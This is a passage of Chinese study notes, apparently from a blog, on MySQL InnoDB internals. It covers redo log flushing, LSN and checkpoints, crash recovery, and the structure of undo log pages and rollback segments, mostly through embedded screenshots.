突然间窗口关闭还未来得及保存~</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203124705.png" alt="image-20211203124703732"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203124651.png" alt="image-20211203124648681"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203124752.png" alt="image-20211203124750634"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203124833.png" alt="image-20211203124831710"></p><p>每个mtr运⾏过程中产⽣的 ⽇志先暂时存到⼀个地⽅，当该mtr结束的时候，将过程中产⽣的⼀ 组redo⽇志再全部复制到log buffer中。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203124916.png" alt="image-20211203124915408"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203124939.png" alt="image-20211203124938284"></p><h1 id="说过的话就一定要办到-——-redo-日志（下）"><a href="#说过的话就一定要办到-——-redo-日志（下）" class="headerlink" title="说过的话就一定要办到 —— redo 日志（下）"></a>说过的话就一定要办到 —— redo 日志（下）</h1><p><strong>刷盘时机</strong></p><p>我们前边说mtr运⾏过程中产⽣的⼀组redo⽇志在mtr结束时会被复 制到log buffer中，可是这些⽇志总在内存⾥呆着也不是个办法， 在⼀些情况下它们会被刷新到磁盘⾥，⽐如：</p><p>log buffer空间不⾜时 log buffer的⼤⼩是有限的（通过系统变量 innodb_log_buffer_size指定），如果不停的往这个有限 ⼤⼩的log buffer⾥塞⼊⽇志，很快它就会被填满。设计 InnoDB的⼤叔认为如果当前写⼊log buffer的redo⽇志量 已经占满了log buffer总容量的⼤约⼀半左右，就需要把这 些⽇志刷新到磁盘上。</p><p>事务提交时 我们前边说过之所以使⽤redo⽇志主要是因为它占⽤的空间 少，还是顺序写，在事务提交时可以不把修改过的Buffer Pool⻚⾯刷新到磁盘，但是为了保证持久性，必须要把修改这 些⻚⾯对应的redo⽇志刷新到磁盘。</p><p>Force Log at Commit 后台线程不停的刷刷刷</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203134658.png" alt="image-20211203134656744"></p><p>我们前边说过log buffer本质上是⼀⽚连续的内存空间，被划分成 了若⼲个512字节⼤⼩的block。将log buffer中的redo⽇志刷新到 磁盘的本质就是把block的镜像写⼊⽇志⽂件中，所以redo⽇志⽂件 其实也是由若⼲个512字节⼤⼩的block组成。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203134917.png" alt="image-20211203134916251"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203135038.png" alt="image-20211203135036955"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203135108.png" alt="image-20211203135106924"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203184208.png" alt="image-20211203184159703"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203184231.png" alt="image-20211203184229848"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203184246.png" alt="image-20211203184245127"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203184300.png" alt="image-20211203184259211"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205141847.png" alt="image-20211203184357992">))<img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203184445.png" alt="image-20211203184443499"></p><p><strong>每⼀组由mtr⽣成的redo⽇志都有⼀个 唯⼀的LSN值与其对应，LSN值越⼩，说明redo⽇志产⽣的越早。</strong></p><p><strong>我们前边说lsn是表示当前系统中写⼊的redo⽇志量，这包括了写 到log buffer⽽没有刷新到磁盘的⽇志，相应的，设计InnoDB的 ⼤叔提出了⼀个表示刷新到磁盘中的redo⽇志量的全局变量，称之 为flushed_to_disk_lsn。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205141859.png" alt="image-20211203185452431"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205141902.png" alt="image-20211203185252487"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203185507.png" alt="image-20211203185504894"></p><p>综上所述，当有新的redo⽇志写⼊到log buffer时，⾸先lsn的 值会增⻓，但flushed_to_disk_lsn不变，随后随着不断有log buffer中的⽇志被刷新到磁盘上，flushed_to_disk_lsn的值也 跟着增⻓。如果两者的值相同时，说明log buffer中的所有redo⽇志 都已经刷新到磁盘中了。</p><p>如果某个写⼊操作要等到操作系统确认已经写到磁盘时才返回，那 需要调⽤⼀下操作系统提供的fsync函数。</p><p>因为lsn的值是代表系统写⼊的redo⽇志量的⼀个总和，⼀个mtr中 产⽣多少⽇志，lsn的值就增加多少（当然有时候要加上log block header和log block trailer的⼤⼩），这样mtr产⽣ 的⽇志写到磁盘中时，很容易计算某⼀个lsn值在redo⽇志⽂件组 中的偏移量，如图：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203185836.png" alt="image-20211203185835487"></p><p>在mtr结束时，会把这⼀组 redo⽇志写⼊到log buffer中。除此之外，在mtr结束时还有⼀ 件⾮常重要的事情要做，就是把在mtr执⾏过程中可能修改过的⻚⾯ 加⼊到Buffer Pool的flush链表。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203190255.png" alt="image-20211203190254351"></p><p>说flush链表中 的脏⻚是按照⻚⾯的第⼀次修改时间从⼤到⼩进⾏排序的。在这个过 程中会在缓存⻚对应的控制块中记录两个关于⻚⾯何时修改的属性：</p><p>oldest_modification：如果某个⻚⾯被加载到Buffer Pool后进⾏第⼀次修改，那么就将修改该⻚⾯的mtr开始时对 应的lsn值写⼊这个属性。</p><p>newest_modification：每修改⼀次⻚⾯，都会将修改该⻚ ⾯的mtr结束时对应的lsn值写⼊这个属性。也就是说该属性 表示⻚⾯最近⼀次修改后对应的系统lsn值。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203190918.png" alt="image-20211203190916691"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203192546.png" alt="image-20211203192545249"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203192804.png" alt="image-20211203192803021"></p><p><strong>redo ⽇志只是为了系统奔溃后恢复脏⻚⽤的，如果对应的脏⻚已经刷新到 了磁盘，也就是说即使现在系统奔溃，那么在重启后也⽤不着使⽤ redo⽇志恢复该⻚⾯了，所以该redo⽇志也就没有存在的必要了， 那么它占⽤的磁盘空间就可以被后续的redo⽇志所重⽤。也就是 说：判断某些redo⽇志占⽤的磁盘空间是否可以覆盖的依据就是它 对应的脏⻚是否已经刷新到磁盘⾥。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203193144.png" alt="image-20211203193143321"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203193402.png" alt="image-20211203193400812"></p><p><strong>如图，虽然mtr_1和mtr_2⽣成的redo⽇志都已经被写到了磁盘 上，但是它们修改的脏⻚仍然留在Buffer Pool中，所以它们⽣成 的redo⽇志在磁盘上的空间是不可以被覆盖的。之后随着系统的运 ⾏，如果⻚a被刷新到了磁盘，那么它对应的控制块就会从flush链 表中移除，就像这样⼦</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203193505.png" alt="image-20211203193504260"></p><p><strong>这样mtr_1⽣成的redo⽇志就没有⽤了，它们占⽤的磁盘空间就可 以被覆盖掉了。设计InnoDB的⼤叔提出了⼀个全局变量 checkpoint_lsn来代表当前系统中可以被覆盖的redo⽇志总量是 多少，这个变量初始值也是8704。</strong></p><p><strong>⽐⽅说现在⻚a被刷新到了磁盘，mtr_1⽣成的redo⽇志就可以被覆 盖了，所以我们需要进⾏⼀个增加checkpoint_lsn的操作，我们 把这个过程称之为做⼀次checkpoint。做⼀次checkpoint其实可 以分为两个步骤</strong></p><p>步骤⼀：计算⼀下当前系统中可以被覆盖的redo⽇志对应的 lsn值最⼤是多少。</p><p>redo⽇志可以被覆盖，意味着它对应的脏⻚被刷到了磁盘，只 要我们计算出当前系统中被最早修改的脏⻚对应的 oldest_modification值，那凡是在系统lsn值⼩于该节点 的oldest_modification值时产⽣的redo⽇志都是可以被覆盖 掉的，我们就把该脏⻚的oldest_modification赋值给 checkpoint_lsn。</p><p>⽐⽅说当前系统中⻚a已经被刷新到磁盘，那么flush链表的 尾节点就是⻚c，该节点就是当前系统中最早修改的脏⻚了， 它的oldest_modification值为8916，我们就把8404赋值 给checkpoint_lsn（也就是说在redo⽇志对应的lsn值⼩于 8916时就可以被覆盖掉）。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203195138.png" alt="image-20211203195135872"></p><p>批量从flush链表中刷出脏⻚ 我们在介绍Buffer Pool的时候说过，⼀般情况下都是后台的线程 在对LRU链表和flush链表进⾏刷脏操作，这主要因为刷脏操作⽐较 慢，不想影响⽤户线程处理请求。但是如果当前系统修改⻚⾯的操作 ⼗分频繁，这样就导致写⽇志操作⼗分频繁，系统lsn值增⻓过快。 如果后台的刷脏操作不能将脏⻚刷出，那么系统⽆法及时 做checkpoint，可能就需要⽤户线程同步的从flush链表中把那些 最早修改的脏⻚（oldest_modification最⼩的脏⻚）刷新到磁 盘，这样这些脏⻚对应的redo⽇志就没⽤了，然后就可以去 做checkpoint了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW ENGINE INNODB STATUS\G</span><br><span class="line">(...省略前边的许多状态)</span><br><span class="line">LOG</span><br><span class="line">---</span><br><span class="line">Log sequence number 124476971</span><br><span class="line">Log flushed up to 124099769</span><br><span class="line">Pages flushed up to 124052503</span><br><span class="line">Last checkpoint at 124052494</span><br><span class="line">0 pending log flushes, 0 pending chkp writes</span><br><span class="line">24 log i&#x2F;o&#39;s done, 2.00 log i&#x2F;o&#39;s&#x2F;second</span><br><span class="line">----------------------</span><br><span class="line">(...省略后边的许多状态</span><br></pre></td></tr></table></figure><p>其中：</p><p>Log sequence number：代表系统中的lsn值，也就是当前 系统已经写⼊的redo⽇志量，包括写⼊log buffer中的⽇ 志。</p><p>Log flushed up to：代表flushed_to_disk_lsn的 值，也就是当前系统已经写⼊磁盘的redo⽇志量。</p><p>Pages flushed up to：代表flush链表中被最早修改的那 个⻚⾯对应的oldest_modification属性值。</p><p>Last checkpoint at：当前系统的checkpoint_lsn值。</p><p><strong>innodb_flush_log_at_trx_commit的⽤法</strong></p><p>如果有的同学对事务的持久性 要求不是那么强烈的话，可以选择修改⼀个称 为innodb_flush_log_at_trx_commit的系统变量的值，该变量 有3个可选的值：</p><p>0：当该系统变量值为0时，表示在事务提交时不⽴即向磁盘中 同步redo⽇志，这个任务是交给后台线程做的。 这样很明显会加快请求处理速度，但是如果事务提交后服务器 挂了，后台线程没有及时将redo⽇志刷新到磁盘，那么该事务 对⻚⾯的修改会丢失。</p><p>1：当该系统变量值为0时，表示在事务提交时需要将redo⽇ 志同步到磁盘，可以保证事务的持久性。1也 是innodb_flush_log_at_trx_commit的默认值。</p><p>2：当该系统变量值为0时，表示在事务提交时需要将redo⽇ 志写到操作系统的缓冲区中，但并不需要保证将⽇志真正的刷 新到磁盘。 这种情况下如果数据库挂了，操作系统没挂的话，事务的持久 性还是可以保证的，但是操作系统也挂了的话，那就不能保证 持久性了。</p><p><strong>checkpoint_lsn之前的redo⽇志都可以被覆盖， 也就是说这些redo⽇志对应的脏⻚都已经被刷新到磁盘中了，既然 它们已经被刷盘，我们就没必要恢复它们了。对于 checkpoint_lsn之后的redo⽇志，它们对应的脏⻚可能没被刷 盘，也可能被刷盘了，我们不能确定，所以需要从 checkpoint_lsn开始读取redo⽇志来恢复⻚⾯。</strong></p><p>确定恢复的起点</p><p>redo⽇志⽂件组的第⼀个⽂件的管理信息中有两个block都存 储了checkpoint_lsn的信息，我们当然是要选取最近发⽣的那次 checkpoint的信息。衡量checkpoint发⽣时间早晚的信息就是所 谓的checkpoint_no，我们只要把checkpoint1和checkpoint2 这两个block中的checkpoint_no值读出来⽐⼀下⼤⼩，哪个的 checkpoint_no值更⼤，说明哪个block存储的就是最近的⼀ 次checkpoint信息。<strong>这样我们就能拿到最近发⽣的checkpoint对应的checkpoint_lsn值以及它在redo⽇志⽂件组中的偏移量 checkpoint_offset。</strong></p><p>确定恢复的终点</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203203814.png" alt="image-20211203203812774"></p><p>怎么恢复</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203204043.png" alt="image-20211203204042433"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203204300.png" alt="image-20211203204259593"></p><p><strong>之后就可以遍历哈希表，因为对同⼀个⻚⾯进⾏修改的redo⽇ 志都放在了⼀个槽⾥，所以可以⼀次性将⼀个⻚⾯修复好（避 免了很多读取⻚⾯的随机IO），这样可以加快恢复速度。另外 需要注意⼀点的是，同⼀个⻚⾯的redo⽇志是按照⽣成时间顺 序进⾏排序的，所以恢复的时候也是按照这个顺序进⾏恢复， 如果不按照⽣成时间顺序进⾏排序的话，那么可能出现错误。 ⽐如原先的修改操作是先插⼊⼀条记录，再删除该条记录，如 果恢复时不按照这个顺序来，就可能变成先删除⼀条记录，再 插⼊⼀条记录，这显然是错误的。</strong></p><blockquote><p><strong>跳过已经刷新到磁盘的⻚⾯ 我们前边说过，checkpoint_lsn之前的redo⽇志对应的脏 ⻚确定都已经刷到磁盘了，但是checkpoint_lsn之后的 redo⽇志我们不能确定是否已经刷到磁盘，主要是因为在最近 做的⼀次checkpoint后，可能后台线程⼜不断的从LRU链表 和flush链表中将⼀些脏⻚刷出Buffer Pool。这些 在checkpoint_lsn之后的redo⽇志，如果它们对应的脏⻚ 在奔溃发⽣时已经刷新到磁盘，那在恢复时也就没有必要根 据redo⽇志的内容修改该⻚⾯了。 那在恢复时怎么知道某个redo⽇志对应的脏⻚是否在奔溃发⽣时已经刷新到磁盘了呢？这还得从⻚⾯的结构说起，我们前边 说过每个⻚⾯都有⼀个称之为File Header的部分，在File Header⾥有⼀个称之为FIL_PAGE_LSN的属性，该属性记载 了最近⼀次修改⻚⾯时对应的lsn值（其实就是⻚⾯控制块中 的newest_modification值）。如果在做了某 次checkpoint之后有脏⻚被刷新到磁盘中，那么该⻚对应的 FIL_PAGE_LSN代表的lsn值肯定⼤于checkpoint_lsn的 值，凡是符合这种情况的⻚⾯就不需要做恢复操作了，所以更 进⼀步提升了奔溃恢复的速度。</strong></p><p>上面这段话巨难理解</p></blockquote><p>遗漏的问题：LOG_BLOCK_HDR_NO是如何 计算的</p><p>我们前边说过，对于实际存储redo⽇志的普通的log block来说， 在log block header处有⼀个称之为LOG_BLOCK_HDR_NO的属 性（忘记了的话回头再看看哈），我们说这个属性代表⼀个唯⼀的标 号。这个属性是初次使⽤该block时分配的，跟当时的系统lsn值有 关。使⽤下边的公式计算该block的LOG_BLOCK_HDR_NO值：</p><p>((lsn / 512) &amp; 0x3FFFFFFFUL) + 1</p><p>这个公式⾥的0x3FFFFFFFUL可能让⼤家有点困惑，其实它的⼆进 制表示可能更亲切⼀点：</p><p>从图中可以看出，0x3FFFFFFFUL对应的⼆进制数的前2位为0，后 30位的值都为1。我们刚开始学计算机的时候就学过，⼀个⼆进制位 与0做与运算（&amp;）的结果肯定是0，⼀个⼆进制位与1做与运算 （&amp;）的结果就是原值。让⼀个数和0x3FFFFFFFUL做与运算的意思 就是要将该值的前2个⽐特位的值置为0，这样该值就肯定⼩于或等 于0x3FFFFFFFUL了。这也就说明了，不论lsn多⼤，((lsn / 512) &amp; 0x3FFFFFFFUL)的值肯定在0<del>0x3FFFFFFFUL之间，再 加1的话肯定在1</del>0x40000000UL之间。⽽0x40000000UL这个值 ⼤家应该很熟悉，这个值就代表着1GB。也就是说系统最多能产⽣不 重复的LOG_BLOCK_HDR_NO值只有1GB个。设计InnoDB的⼤叔规定 redo⽇志⽂件组中包含的所有⽂件⼤⼩总和不得超过512GB，⼀个 block⼤⼩是512字节，也就是说redo⽇志⽂件组中包含的block块 最多为1GB个，所以有1GB个不重复的编号值也就够⽤了。</p><p>另外，LOG_BLOCK_HDR_NO值的第⼀个⽐特位⽐较特殊，称之 为flush bit，如果该值为1，代表着本block是在某次将log buffer中的block刷新到磁盘的操作中的第⼀个被刷⼊的block。</p><h1 id="后悔了怎么办-——-undo-日志（上）"><a href="#后悔了怎么办-——-undo-日志（上）" class="headerlink" title="后悔了怎么办 —— undo 日志（上）"></a>后悔了怎么办 —— undo 日志（上）</h1><p>事务回滚的需求</p><ul><li>情景1：事务执行到一半，出现错误</li><li>情景2：手动回滚</li><li>所以需要让事务看起来什么都没做，就需要进行回滚</li></ul><p>回滚之前的操作</p><ul><li>插入需要记录主键值，才能回滚删除</li><li>删除需要保存记录的内容，才能回滚插入</li><li>修改需要记录旧值</li></ul><p>记录这些东西的就是undo log，回滚日志</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092811.png" alt="image-20211205092803111"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092822.png" alt="image-20211205092820702"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092839.png" alt="image-20211205092837740"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092849.png" alt="image-20211205092847619"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092900.png" alt="image-20211205092858764"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092909.png" alt="image-20211205092908373"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092940.png" alt="image-20211205092938764"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205092951.png" alt="image-20211205092950265"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205093021.png" alt="image-20211205093019704"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205093037.png" alt="image-20211205093036167"></p><p>在不更新主键的情况下，又可以细分为被更新的列占用的存储空间不发生变化和发生变化的情况。 </p><ul><li>就地更新（in-place update）</li><li>先删除掉旧记录，再插入新记录 </li></ul><p>在不更新主键的情况下，如果有任何一个被更新的列更新前和更新后占 用的存储空间大小不一致，那么就需要先把这条旧的记录从聚簇索引页 面中删除掉，然后再根据更新后列的值创建一条新的记录插入到页面 中。 UPDATE undo_demo SET key1 = ‘P92’, col = ‘手枪’ WHERE id = 2; 1 2 3 UPDATE undo_demo SET key1 = ‘M249’, col = ‘机枪’ WHERE id = 2; 1 2 3 请注意一下，我们这里所说的删除并不是delete mark操作，而是真正的 删除掉，也就是把这条记录从正常记录链表中移除并加入到垃圾链表中， 并且修改页面中相应的统计信息（比如PAGE_FREE、PAGE_GARBAGE等这些 信息）。不过这里做真正删除操作的线程并不是在唠叨DELETE语句中做 purge操作时使用的另外专门的线程，而是由用户线程同步执行真正的 删除操作，真正删除之后紧接着就要根据各个列更新后的值创建的新记 录插入。 这里如果新创建的记录占用的存储空间大小不超过旧记录占用的空间， 那么可以直接重用被加入到垃圾链表中的旧记录所占用的存储空间，否 则的话需要在页面中新申请一段空间以供新记录使用，如果本页面内已 经没有可用的空间的话，那就需要进行页面分裂操作，然后再插入新记 录。</p><p>delete mark操作对应的undo日志的结构就是这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205093051.png" alt="image-20211205093050119"></p><p>针对UPDATE不更新主键的情况</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205093442.png" alt="image-20211205093440402"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205093539.png" alt="image-20211205093538234"></p><p>更新主键的情况</p><p>在聚簇索引中，记录是按照主键值的大小连成了一个单向链表的，如果我 们更新了某条记录的主键值，意味着这条记录在聚簇索引中的位置将会发 生改变，比如你将记录的主键值从1更新为10000，如果还有非常多的记录 的主键值分布在1 ~ 10000之间的话，那么这两条记录在聚簇索引中就有可 能离得非常远，甚至中间隔了好多个页面。针对UPDATE语句中更新了记录主键值的这种情况，InnoDB在聚簇索引中分了两步处理： </p><p>将旧记录进行delete mark操作高能注意：这里是<strong>delete mark操作</strong>！这里是delete mark操作！这里是 delete mark操作！也就是说在UPDATE语句所在的事务提交前，对旧记录 只做一个delete mark操作，在事务提交后才由专门的线程做purge操 作，把它加入到垃圾链表中。这里一定要和我们上边所说的在不更新记 录主键值时，先真正删除旧记录，再插入新记录的方式区分开！ 小贴士： 之所以只对旧记录做delete mark操作，是因为别的事务同时 也可能访问这条记录，如果把它真正的删除加入到垃圾链表后，别的 事务就访问不到了。这个功能就是所谓的MVCC，我们后边的章节中 会详细唠叨什么是个MVCC。 </p><p>根据更新后各列的值创建一条新记录，并将其插入到聚簇索引中（需重 新定位插入的位置）。 由于更新后的记录主键值发生了改变，所以需要重新从聚簇索引中定位 这条记录所在的位置，然后把它插进去。 针对UPDATE语句更新记录主键值的这种情况，在对该记录进行delete mark 操作前，会记录一条类型为TRX_UNDO_DEL_MARK_REC的undo日志；之后插入新记录时，会记录一条类型为TRX_UNDO_INSERT_REC的undo日志，也就是说 每对一条记录的主键值做改动时，会记录2条undo日志。这些日志的格式我 们上边都唠叨过了，就不赘述了。</p><h1 id="后悔了怎么办-——-undo-日志（下）"><a href="#后悔了怎么办-——-undo-日志（下）" class="headerlink" title="后悔了怎么办 —— undo 日志（下）"></a>后悔了怎么办 —— undo 日志（下）</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205094340.png" alt="image-20211205094338543"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205094458.png" alt="image-20211205094457191"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205094510.png" alt="image-20211205094509155"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205094534.png" alt="image-20211205094532681"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205094604.png" alt="image-20211205094602947"></p><p><strong>TRX_UNDO_PAGE_TYPE</strong>：本页面准备存储什么种类的undo日志。</p><ul><li>TRX_UNDO_INSERT </li><li>TRX_UNDO_UPDATE</li></ul><p>不同大类的undo日志不能混着存储， 比如一个Undo页面的TRX_UNDO_PAGE_TYPE属性值为TRX_UNDO_INSERT，那 么这个页面就只能存储类型为TRX_UNDO_INSERT_REC的undo日志，其他类 型的undo日志就不能放到这个页面中了。</p><p>之 所 以 把 undo 日 志 分 成 两 个 大 类 ， 是 因 为 类 型 为 TRX_UNDO_INSERT_REC的undo日志在事务提交后可以直接删除 掉，而其他类型的undo日志还需要为所谓的MVCC服务，不能直接删 除掉，对它们的处理需要区别对待。</p><p><strong>TRX_UNDO_PAGE_START</strong>：表示在当前页面中是从什么位置开始存储undo日 志的，或者说表示第一条undo日志在本页面中的起始偏移量。 </p><p><strong>TRX_UNDO_PAGE_FREE</strong>：与上边的TRX_UNDO_PAGE_START对应，表示当前页 面中存储的最后一条undo日志结束时的偏移量，或者说从这个位置开 始，可以继续写入新的undo日志。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205095041.png" alt="image-20211205095039563"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205095122.png" alt="image-20211205095120719"></p><p>在first undo page中除了记录Undo Page Header之外，还 会记录其他的一些管理信息</p><p>同一个 Undo 页 面 要 么 只 存 储 TRX_UNDO_INSERT 大 类 的 undo 日 志 ， 要 么 只 存 储 TRX_UNDO_UPDATE大类的undo日志，反正不能混着存，所以在一个事务执行 过程中就可能需要2个Undo页面的链表，一个称之为insert undo链表，另一 个称之为update undo链表，画个示意图就是这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205095305.png" alt="image-20211205095303270"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205095317.png" alt="image-20211205095315757"></p><p><strong>多个事务中的Undo页面链表</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205142003.png" alt="image-20211205095405225"></p><p><strong>undo日志具体写入过程</strong></p><p>段是一个逻辑上 的概念，本质上是由若干个零散页面和若干个完整的区组成的。</p><p>INODE Entry结构描述了这个段的各种信息，比如段的ID，段内的各种链表基节点，零散页面的页号有哪些 等信息</p><p>Segment Header是来定位INODE Entry：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205142009.png" alt="image-20211205095631991"></p><p>段：Undo Log Segment</p><p>链表中的页面都是从这个段里边申请的</p><p>在Undo页面链表的第一个页面，也就是上边提到的first undo page中设计 了一个称之为Undo Log Segment Header的部分，这个部分中包含了该链表 对应的段的segment header信息以及其他的一些关于这个段的信息，所以 Undo页面链表的第一个页面其实长这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205095804.png" alt="image-20211205095803332"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205100113.png" alt="image-20211205100111686"></p><p><strong>TRX_UNDO_STATE：本Undo页面链表处在什么状态。</strong></p><p><strong>TRX_UNDO_ACTIVE</strong>：活跃状态，也就是一个活跃的事务正在往这个段 里边写入undo日志。 </p><p><strong>TRX_UNDO_CACHED</strong>：被缓存的状态。处在该状态的Undo页面链表等待着 之后被其他事务重用。 </p><p><strong>TRX_UNDO_TO_FREE</strong>：对于insert undo链表来说，如果在它对应的事 务提交之后，该链表不能被重用，那么就会处于这种状态。 </p><p><strong>TRX_UNDO_TO_PURGE</strong>：对于update undo链表来说，如果在它对应的事 务提交之后，该链表不能被重用，那么就会处于这种状态。 TRX_UNDO_PREPARED：包含处于PREPARE阶段的事务产生的undo日志。</p><p><strong>TRX_UNDO_PREPARED</strong>：包含处于PREPARE阶段的事务产生的undo日志。事务的PREPARE阶段是在所谓的分布式事务中才出现的</p><p><strong>TRX_UNDO_LAST_LOG：本Undo页面链表中最后一个Undo Log Header的位 置。</strong></p><p><strong>TRX_UNDO_FSEG_HEADER：本Undo页面链表对应的段的Segment Header信 息（就是我们上一节介绍的那个10字节结构，通过这个信息可以找到该 段对应的INODE Entry）。</strong></p><p><strong>TRX_UNDO_PAGE_LIST：Undo页面链表的基节点。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205100712.png" alt="image-20211205100711336"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205100745.png" alt="image-20211205100744167"></p><p>TRX_UNDO_DICT_TRANS：标记本组undo日志是不是由DDL语句产生的。</p><p>TRX_UNDO_TABLE_ID：如果TRX_UNDO_DICT_TRANS为真，那么本属性表示 DDL语句操作的表的table id。</p><p>TRX_UNDO_HISTORY_NODE：一个12字节的List Node结构，代表一个称之 为History链表的节点。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205101325.png" alt="image-20211205101323953"></p><p><strong>重用Undo页面</strong></p><p>一个Undo页面链表是否可以被重用的条件很简单：</p><p>该链表中只包含一个Undo页面。 如果一个事务执行过程中产生了非常多的undo日志，那么它可能申请非 常多的页面加入到Undo页面链表中。在该事物提交后，如果将整个链表 中的页面都重用，那就意味着即使新的事务并没有向该Undo页面链表中 写入很多undo日志，那该链表中也得维护非常多的页面，那些用不到的 页面也不能被别的事务所使用，这样就造成了另一种浪费。所以设计 InnoDB的大叔们规定，只有在Undo页面链表中只包含一个Undo页面时， 该链表才可以被下一个事务所重用。</p><p>该Undo页面已经使用的空间小于整个页面空间的3/4。</p><p><strong>insert undo链表</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205101646.png" alt="image-20211205101645615"></p><p>在重用Undo页面链表写入新的一组undo日志时，不 仅会写入新的Undo Log Header，还会适当调整Undo Page Header、 Undo Log Segment Header、Undo Log Header中的一些属性，比如 TRX_UNDO_PAGE_START、TRX_UNDO_PAGE_FREE等等等等。</p><p><strong>update undo链表</strong> </p><p>在一个事务提交后，它的update undo链表中的undo日志也不能立即删除 掉（这些日志用于MVCC，我们后边会说的）。所以如果之后的事务想 重用update undo链表时，就不能覆盖之前事务写入的undo日志。这样就 相当于在同一个Undo页面中写入了多组的undo日志，效果看起来就是这 样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205142053.png" alt="image-20211205101821580"></p><p>为了更好的管理这些链表，设 计InnoDB的大叔又设计了一个称之为<strong>Rollback Segment Header的页面</strong>，在 这个页面中存放了各个Undo页面链表的frist undo page的页号，他们把这 些页号称之为undo slot。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205102014.png" alt="image-20211205102013142"></p><p>每一个Rollback Segment Header页面都对应着一 个段，这个段就称为Rollback Segment，翻译过来就是回滚段。为了某个目的去分 配页面的话都得先申请一个段。Rollback Segment里其实只有一个页面。</p><p>TRX_RSEG_MAX_SIZE：本Rollback Segment中管理的所有Undo页面链表中 的Undo页面数量之和的最大值。换句话说，本Rollback Segment中所有 Undo页面链表中的Undo页面数量之和不能超过TRX_RSEG_MAX_SIZE代表的 值。 该属性的值默认为无限大，也就是我们想写多少Undo页面都可以。 </p><p>小贴士： 无限大其实也只是个夸张的说法，4个字节能表示最大的数 